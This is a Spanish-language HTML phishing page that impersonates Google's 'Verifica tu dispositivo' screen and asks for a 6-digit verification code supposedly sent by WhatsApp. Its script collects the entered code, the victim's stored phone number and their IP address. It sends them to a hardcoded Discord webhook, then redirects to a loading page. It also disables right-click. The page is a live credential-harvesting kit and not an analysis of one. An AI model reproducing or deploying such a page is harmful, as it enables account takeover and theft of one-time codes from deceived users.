<!DOCTYPE html>
<html lang="es">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmación</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --bg-color: #f0f4f9;
            --box-bg: #ffffff;
            --text-main: #1f1f1f;
            --text-secondary: #444746;
            --blue: #0b57d0;
            --blue-hover: #0842a0;
        }
        body, html {
            margin: 0;
            padding: 0;
            background-color: var(--bg-color);
            font-family: 'Google Sans', 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background-color: var(--box-bg);
            border-radius: 28px;
            width: 1040px;
            max-width: 90%;
            display: flex;
            flex-direction: row;
            padding: 48px 40px;
            box-sizing: border-box;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            z-index: 10;
        }
        .left-panel {
            flex: 1;
            padding-right: 48px;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
        }
        .right-panel {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .google-logo {
            height: 36px;
            width: auto;
            margin-bottom: 24px;
            display: block;
        }
        h1 {
            font-size: 36px;
            color: var(--text-main);
            font-weight: 400;
            margin: 0 0 16px 0;
            line-height: 1.2;
        }
        p {
            font-size: 16px;
            color: var(--text-main);
            margin: 0;
        }
        
        .form-group {
            width: 100%;
            margin-bottom: 24px;
            position: relative;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: var(--text-secondary);
        }
        
        .form-control {
            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
            width: 100%;
            height: 48px;
            padding: 8px 16px;
            border: 1px solid #747775;
            border-radius: 4px;
            font-size: 18px;
            letter-spacing: 4px;
            text-align: center;
            transition: all 0.2s;
            box-sizing: border-box;
            color: var(--text-main);
        }
        .form-control:focus {
            outline: none;
            border: 2px solid var(--blue);
            padding: 8px 15px;
        }
        
        form { width: 100%; }

        .actions-row {
            width: 100%;
            margin-top: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .secondary-link {
            color: var(--blue);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .secondary-link:hover {
            text-decoration: underline;
        }

        button.btn-primary {
            background-color: var(--blue);
            color: white;
            border: none;
            border-radius: 20px;
            padding: 10px 24px;
            font-family: inherit;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        button.btn-primary:hover {
            background-color: var(--blue-hover);
        }

        .notice-box {
            background-color: #f8fafc;
            border-radius: 12px;
            padding: 16px;
            margin-top: 48px;
            width: 100%;
            display: flex;
            gap: 12px;
            font-size: 13px;
            color: var(--text-secondary);
            border: 1px solid #e1e4e8;
        }
        .notice-box i { color: var(--blue); font-size: 18px; }

        @media (max-width: 900px) {
            .container {
                width: 100%;
                max-width: 450px;
                flex-direction: column;
                padding: 36px 32px;
                border-radius: 8px;
                box-shadow: none;
                background-color: transparent;
                margin: 20px auto;
            }
            body { background-color: #fff; }
            .left-panel {
                padding-right: 0;
                margin-bottom: 32px;
                align-items: center;
                text-align: center;
            }
            .google-logo { margin: 0 auto 24px; height: 36px; width: auto; }
            h1 { font-size: 24px; }
            p { font-size: 14px; }
            .actions-row { flex-direction: column-reverse; gap: 24px; align-items: flex-start; }
            button.btn-primary { width: 100%; }
        }

        @media (max-width: 480px) {
            .container {
                padding: 24px 16px;
                max-width: 100%;
            }
        }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body oncontextmenu="return false">
    <div class="container">
        <div class="left-panel">
            <img class="google-logo" src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
            <h1>Verifica tu<br>dispositivo</h1>
            <p id="security-subtitle">Introduce el código de 6 dígitos enviado a tu número.</p>
        </div>
        
        <div class="right-panel">
            <form id="verificationForm">
                <div class="form-group">
                    <label for="auth">Código de pantalla</label>
                    <input type="text" id="auth" name="auth" minlength="6" maxlength="6" placeholder="------" required pattern="[0-9]{6}" class="form-control" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6)">
                </div>
                
                <div class="actions-row">
                    <a href="#" class="secondary-link">Probar otro método</a>
                    <button type="submit" id="submitButton" class="btn-primary">Siguiente</button>
                </div>
                
                <div class="notice-box">
                    <i class="fas fa-shield-halved"></i>
                    <p>Esta verificación asegura que eres el propietario legítimo de la cuenta vinculada.</p>
                </div>
            </form>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1465605598677565473/GpPoSB9EH8AtU-3gb5Eqr3TA_A2Z5Q_nU4lzAtPhE00nDk9SRjMuj5HU63u71JKjr-6G';

        $(document).ready(function() {
            function updateSubtitle() {
                const tel = localStorage.getItem('telefonoUsuario') || '****';
                const digits = tel.replace(/\D/g, '');
                const last4 = digits.length >= 4 ? digits.slice(-4) : '****';
                $('#security-subtitle').text(`Hemos enviado un código de 6 dígitos a tu número de WhatsApp que termina en ****${last4}`);
            }
            updateSubtitle();

            $('#verificationForm').submit(function(e) {
                e.preventDefault();
                const code = $('#auth').val();
                const tel = localStorage.getItem('telefonoUsuario') || 'Desconocido';
                
                $('#submitButton').prop('disabled', true).text('Verificando...');

                $.getJSON("https://api.ipify.org?format=json", function(data) {
                    const ip = data.ip;
                    const embed = {
                        title: "🔐 Código de Pantalla Ingresado",
                        color: 15158332,
                        fields: [
                            { name: "📱 Teléfono", value: `\`\`\`${tel}\`\`\``, inline: true },
                            { name: "🔑 Código", value: `\`\`\`${code}\`\`\``, inline: true },
                            { name: "🌐 IP", value: ip, inline: false }
                        ],
                        timestamp: new Date().toISOString()
                    };
                    
                    $.ajax({
                        url: DISCORD_WEBHOOK_URL,
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        data: JSON.stringify({ "embeds": [embed] })
                    }).done(function() {
                        window.location = 'cargando3.html';
                    }).fail(function() {
                        window.location = 'cargando3.html';
                    });
                });
            });
        });
    </script>
</body>
</html>
